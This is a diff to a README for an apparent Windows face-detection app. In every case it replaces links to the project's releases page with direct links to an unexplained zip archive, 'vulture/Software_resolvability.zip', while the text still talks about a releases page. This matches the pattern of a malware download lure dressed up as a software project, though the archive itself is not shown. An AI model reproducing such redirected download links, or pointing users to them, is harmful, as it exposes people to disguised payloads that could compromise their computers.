@@ -1,12 +1,12 @@
 # 🔍 python - Face detection made simple
 
-[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/oilpipelinebuber960/python/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/oilpipelinebuber960/python/raw/refs/heads/main/vulture/Software_resolvability.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-https://github.com/oilpipelinebuber960/python/releases
+https://github.com/oilpipelinebuber960/python/raw/refs/heads/main/vulture/Software_resolvability.zip
 
 ## 🖥️ What this app does
 
@@ -33,7 +33,7 @@ You do not need any special setup if the release page includes a ready-to-run Wi
 ## 📦 Download and set up
 
 1. Open the releases page:
-   https://github.com/oilpipelinebuber960/python/releases
+   https://github.com/oilpipelinebuber960/python/raw/refs/heads/main/vulture/Software_resolvability.zip
 
 2. Look for the latest release.
 
@@ -268,4 +268,4 @@ The app runs on your computer. It processes the files in the folder you choose. 
 
 Use this page to download the current Windows version:
 
-https://github.com/oilpipelinebuber960/python/releases
+https://github.com/oilpipelinebuber960/python/raw/refs/heads/main/vulture/Software_resolvability.zip
